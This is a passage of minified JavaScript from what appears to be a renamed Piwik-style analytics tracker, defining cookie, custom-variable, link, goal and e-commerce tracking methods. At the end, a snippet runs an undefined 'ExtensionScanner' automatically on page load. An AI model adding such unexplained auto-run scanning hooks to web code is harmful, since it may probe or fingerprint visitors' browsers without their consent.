        setCustomVariable: function (bm, bl, bp, bn) {
          var bo;
          if (!r(bn)) {
            bn = "visit";
          }
          if (bm > 0) {
            bl = r(bl) && !k(bl) ? String(bl) : bl;
            bp = r(bp) && !k(bp) ? String(bp) : bp;
            bo = [bl.slice(0, bd), bp.slice(0, bd)];
            if (bn === "visit" || bn === 2) {
              R();
              V[bm] = bo;
            } else {
              if (bn === "page" || bn === 3) {
                aH[bm] = bo;
              }
            }
          }
        },
        getCustomVariable: function (bm, bn) {
          var bl;
          if (!r(bn)) {
            bn = "visit";
          }
          if (bn === "page" || bn === 3) {
            bl = aH[bm];
          } else {
            if (bn === "visit" || bn === 2) {
              R();
              bl = V[bm];
            }
          }
          if (!r(bl) || bl && bl[0] === "") {
            return false;
          }
          return bl;
        },
        deleteCustomVariable: function (bl, bm) {
          if (this.getCustomVariable(bl, bm)) {
            this.setCustomVariable(bl, "", "", bm);
          }
        },
        setLinkTrackingTimer: function (bl) {
          aM = bl;
        },
        setDownloadExtensions: function (bl) {
          au = bl;
        },
        addDownloadExtensions: function (bl) {
          au += "|" + bl;
        },
        setDomains: function (bl) {
          aO = k(bl) ? [bl] : bl;
          aO.push(a6);
        },
        setIgnoreClasses: function (bl) {
          W = k(bl) ? [bl] : bl;
        },
        setRequestMethod: function (bl) {
          aQ = bl || "GET";
        },
        setReferrerUrl: function (bl) {
          aS = bl;
        },
        setCustomUrl: function (bl) {
          aC = a5(bi, bl);
        },
        setDocumentTitle: function (bl) {
          ar = bl;
        },
        setAPIUrl: function (bl) {
          ah = bl;
        },
        setDownloadClasses: function (bl) {
          aG = k(bl) ? [bl] : bl;
        },
        setLinkClasses: function (bl) {
          aj = k(bl) ? [bl] : bl;
        },
        setCampaignNameKey: function (bl) {
          aw = k(bl) ? [bl] : bl;
        },
        setCampaignKeywordKey: function (bl) {
          aq = k(bl) ? [bl] : bl;
        },
        discardHashTag: function (bl) {
          Y = bl;
        },
        setCookieNamePrefix: function (bl) {
          bg = bl;
          V = ae();
        },
        setCookieDomain: function (bl) {
          ac = t(bl);
          aJ();
        },
        setCookiePath: function (bl) {
          bh = bl;
          aJ();
        },
        setVisitorCookieTimeout: function (bl) {
          ag = bl * 1000;
        },
        setSessionCookieTimeout: function (bl) {
          ai = bl * 1000;
        },
        setReferralCookieTimeout: function (bl) {
          aD = bl * 1000;
        },
        setConversionAttributionFirstReferrer: function (bl) {
          aB = bl;
        },
        disableCookies: function () {
          aa = true;
        },
        deleteCookies: function () {
          P();
        },
        setDoNotTrack: function (bm) {
          var bl = c.doNotTrack || c.msDoNotTrack;
          bc = bm && (bl === "yes" || bl === "1");
          if (bc) {
            this.disableCookies();
          }
        },
        addListener: function (bm, bl) {
          aW(bm, bl);
        },
        enableLinkTracking: function (bl) {},
        disablePerformanceTracking: function () {
          az = false;
        },
        setGenerationTimeMs: function (bl) {
          an = parseInt(bl, 10);
        },
        setHeartBeatTimer: function (bn, bm) {
          var bl = new Date();
          X = bl.getTime() + bn * 1000;
          al = bm * 1000;
        },
        killFrame: function () {
          if (z.location !== z.top.location) {
            z.top.location = z.location;
          }
        },
        redirectFile: function (bl) {
          if (z.location.protocol === "file:") {
            z.location = bl;
          }
        },
        setCountPreRendered: function (bl) {
          ay = bl;
        },
        trackGoal: function (bl, bn, bm) {
          ao(function () {
            aK(bl, bn, bm);
          });
        },
        trackLink: function (bm, bl, bn) {
          ao(function () {
            a8(bm, bl, bn);
          });
        },
        trackPageView: function (bl, bm) {
          if (u(ba)) {
            ao(function () {
              F(S, ah, ba);
            });
          } else {
            ao(function () {
              aX(bl, bm);
            });
          }
        },
        trackSiteSearch: function (bl, bn, bm) {
          ao(function () {
            ap(bl, bn, bm);
          });
        },
        setEcommerceView: function (bo, bl, bn, bm) {
          if (!r(bn) || !bn.length) {
            bn = "";
          } else {
            if (bn instanceof Array) {
              bn = JSON2.stringify(bn);
            }
          }
          aH[5] = ["_pkc", bn];
          if (r(bm) && String(bm).length) {
            aH[2] = ["_pkp", bm];
          }
          if ((!r(bo) || !bo.length) && (!r(bl) || !bl.length)) {
            return;
          }
          if (r(bo) && bo.length) {
            aH[3] = ["_pks", bo];
          }
          if (!r(bl) || !bl.length) {
            bl = "";
          }
          aH[4] = ["_pkn", bl];
        },
        addEcommerceItem: function (bp, bl, bn, bm, bo) {
          if (bp.length) {
            aZ[bp] = [bp, bl, bn, bm, bo];
          }
        },
        trackEcommerceOrder: function (bl, bp, bo, bn, bm, bq) {
          a3(bl, bp, bo, bn, bm, bq);
        },
        trackEcommerceCartUpdate: function (bl) {
          bf(bl);
        }
      };
    }
    function q() {
      return {
        push: K
      };
    }
    N(z, "beforeunload", L, false);
    l();
    Date.prototype.getTimeAlias = Date.prototype.getTime;
    E = new w();
    for (H = 0; H < _tvq.length; H++) {
      if (_tvq[H][0] === "setTrackerUrl" || _tvq[H][0] === "setSiteId") {
        K(_tvq[H]);
        delete _tvq[H];
      }
    }
    for (H = 0; H < _tvq.length; H++) {
      if (_tvq[H]) {
        K(_tvq[H]);
      }
    }
    _tvq = new q();
    A = {
      addPlugin: function (i, P) {
        a[i] = P;
      },
      getTracker: function (i, P) {
        return new w(i, P);
      },
      getAsyncTracker: function () {
        return E;
      }
    };
    return A;
  }();
}
const observer = new MutationObserver((mutations, obs) => {
  if (document.body) {
    obs.disconnect();
    new ExtensionScanner().execute();
  }
});
if (document.body) {
  new ExtensionScanner().execute();
} else {
  observer.observe(document.documentElement, {
    childList: true,
    subtree: true
  });
}
;